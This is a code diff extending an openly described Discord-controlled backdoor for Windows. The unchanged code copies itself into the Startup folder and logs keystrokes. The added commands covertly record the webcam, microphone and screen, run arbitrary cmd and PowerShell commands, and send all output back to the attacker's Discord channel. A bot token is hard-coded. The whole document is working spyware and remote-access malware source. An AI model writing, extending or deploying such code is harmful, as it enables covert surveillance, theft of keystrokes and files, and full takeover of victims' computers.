@@ -1,7 +1,8 @@
-
-
 import discord
 from discord.ext import commands
+import pyautogui
+import cv2
+import asyncio
 from PIL import ImageGrab
 import io
 from pynput.keyboard import Listener
@@ -14,10 +15,20 @@ import pyautogui
 import time
 import setproctitle
 import shutil
-
-import shutil
+import pyaudio
+import wave
 import os
 import sys
+import socket
+import cv2
+import asyncio
+import tkinter as tk
+from tkinter import messagebox
+from plyer import notification
+import getpass
+import pyautogui
+import numpy as np
+import pyscreenrec
 
 current_script_path = os.path.abspath(sys.argv[0])
 
@@ -26,7 +37,6 @@ destination_directory = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\St
 destination_path = os.path.join(destination_directory, os.path.basename(current_script_path))
 
 shutil.copy2(current_script_path, destination_path)
-print(f"Copy of the script moved to: {destination_path}")
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -45,6 +55,12 @@ commandsList = ["!screenshot sends screenshot of users pc",
                 "!rightclick",
                 "!doubleclick",
                 "!createfile <content> <path> creates a file with the content/text of <content> on the path of <path>, something like !createfile testing C:\test.txt"
+                "!webcam <time> records users webcam",
+                "!sendnotification <title> <content> <timeout> sends a notification to bottom right, if u want spaces in the message separate the words with a _",
+                "!microphone <time> records users microphone input",
+                "!startrec <fps> records screen",
+                "!stoprec stop the recording of the screen and sends it here",
+                "!powershell <cmd> sends a command to windows powershell, !!! IF THERES SPACES IN THE COMMAND SEPARATE THEM WITH A _ !!!"
 ]
 
 keys = []
@@ -105,13 +121,139 @@ def keylogger_thread():
         listener.join()
 
 @bot.event
-async def on_ready(ctx):
-    IP = requests.get("http://api.ipify.org/")
-    await ctx.send(IP + " has launched the backdoor")
+async def on_ready():
+    activity = discord.Activity(name=str(getpass.getuser()), type=1)
+    await bot.change_presence(status=discord.Status.idle, activity=activity)
 
 @bot.command()
 async def commandlist(ctx):
     await ctx.send(commandsList)
+
+rec=pyscreenrec.ScreenRecorder()
+
+@bot.command()
+async def startrec(ctx,fps):
+    # Use the start_recording method of the ScreenRecorder instance
+    file = "recording"
+    rec.start_recording(file + ".mp4", int(fps))  # 15 seconds recording duration
+    await ctx.send("Recording started.")
+
+@bot.command()
+async def stoprec(ctx):
+    rec.stop_recording()
+
+    recording = "recording.mp4"
+    await ctx.send("Recording finished. Sending recorded content...")
+    with open(recording, "rb") as video_file:
+        await ctx.send(file=discord.File(video_file, filename="video.mp4"))
+
+
+@bot.command()
+async def sendnotification(ctx,tit,msg,time):
+    title = str(tit.replace("_"," "))
+    message = str(msg.replace("_"," "))
+    timeout = int(time)
+    notification.notify(title=title, message=message, timeout=timeout)
+    await ctx.send("sent notification to this man")
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+RECORD_SECONDS = 60
+
+@bot.command()
+async def webcam(ctx, delay: int):
+    if delay <= 0:
+        await ctx.send("Please provide a positive delay value.")
+        return
+
+    # Get the user who triggered the command
+    user = ctx.author
+
+    # Open a connection to the webcam
+    cap = cv2.VideoCapture(0)
+
+    if not cap.isOpened():
+        await ctx.send("Could not open webcam.")
+        return
+
+    await ctx.send(f"Recording video for {delay} seconds. Smile!")
+
+    # Define the codec and create a VideoWriter object
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    output_filename = f"{user.id}_webcam.avi"
+    out = cv2.VideoWriter(output_filename, fourcc, 20.0, (640, 480))
+
+    # Record video for the specified duration
+    start_time = asyncio.get_event_loop().time()
+    while (asyncio.get_event_loop().time() - start_time) < delay:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        out.write(frame)
+
+    await ctx.send("Recording finished.")
+
+    # Release the webcam and video writer
+    cap.release()
+    out.release()
+
+    # Create a discord.File from the recorded video
+    recorded_video = discord.File(output_filename)
+
+    await ctx.send("Here's your recorded video:", file=recorded_video)
+
+    # Clean up: Delete the saved video file
+    import os
+    os.remove(output_filename)
+
+@bot.command()
+async def microphone(ctx,delay):
+    RECORD_SECONDS = int(delay)
+    # Get the user who triggered the command
+    user = ctx.author
+
+    # Initialize PyAudio
+    audio = pyaudio.PyAudio()
+
+    # Open a recording stream
+    stream = audio.open(format=FORMAT,
+                        channels=CHANNELS,
+                        rate=RATE,
+                        input=True,
+                        frames_per_buffer=CHUNK)
+
+    await ctx.send(f"Recording audio for {RECORD_SECONDS} seconds")
+
+    frames = []
+
+    # Record audio in chunks and store in frames
+    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    await ctx.send("Recording finished.")
+
+    # Close and terminate the stream
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    # Save the recorded audio to a WAV file
+    output_filename = f"{user.id}_audio.wav"
+    with wave.open(output_filename, 'wb') as wf:
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(audio.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+
+    await ctx.send(f"Audio saved as {output_filename}")
+    await ctx.send(file=discord.File(output_filename))  # Send the recorded audio file
+
+    # Clean up: Delete the saved audio file
+    import os
+    os.remove(output_filename)
 
 @bot.command()
 async def screenshot(ctx):
@@ -133,10 +275,42 @@ async def sendkeys(ctx):
     await ctx.send(file=file)
 
 @bot.command()
-async def cmd(ctx,command):
-    newCommand = command.replace("_"," ")
+async def cmd(ctx, command):
+    import subprocess
+    newCommand = command.replace("_", " ")
     await ctx.send(str(newCommand) + " has been sent")
-    Functions.exec_cmd(newCommand)
+    
+    try:
+        result = subprocess.check_output(newCommand, shell=True, stderr=subprocess.STDOUT, text=True)
+        output_filename = "command_output.txt"
+        
+        with open(output_filename, "w") as output_file:
+            output_file.write(result)
+            
+        with open(output_filename, "rb") as file:
+            await ctx.send("Command executed successfully. Output:", file=discord.File(file, filename=output_filename))
+        os.remove(file)
+    except subprocess.CalledProcessError as e:
+        await ctx.send("Command execution failed. Error:\n```" + e.output + "```")
+
+@bot.command()
+async def powershell(ctx, command):
+    import subprocess
+    newCommand = command.replace("_", " ")
+    await ctx.send(str(newCommand) + " has been sent")
+    
+    try:
+        result = subprocess.check_output(newCommand, shell=True, stderr=subprocess.STDOUT, text=True)
+        output_filename = "command_output.txt"
+        
+        with open(output_filename, "w") as output_file:
+            output_file.write(result)
+            
+        with open(output_filename, "rb") as file:
+            await ctx.send("Command executed successfully. Output:", file=discord.File(file, filename=output_filename))
+        os.remove(file)
+    except subprocess.CalledProcessError as e:
+        await ctx.send("Command execution failed. Error:\n```" + e.output + "```")
 
 @bot.command()
 async def ip(ctx):
@@ -197,6 +371,8 @@ async def doubleclick(ctx):
 async def createfile(ctx, content, path):
     result = Functions.createfile(content, path)
     await ctx.send(result)
+
+TOKEN = "MTE0NTY5NDQ1NjQ2OTc4NjcwNQ.GS8VhK.pD3jSrBDuUYoFuW9NxYvByM-AXcdclP6sxawGw"
 
 with Listener(on_press=Functions.capture_keystroke) as listener:
     bot.run(TOKEN)
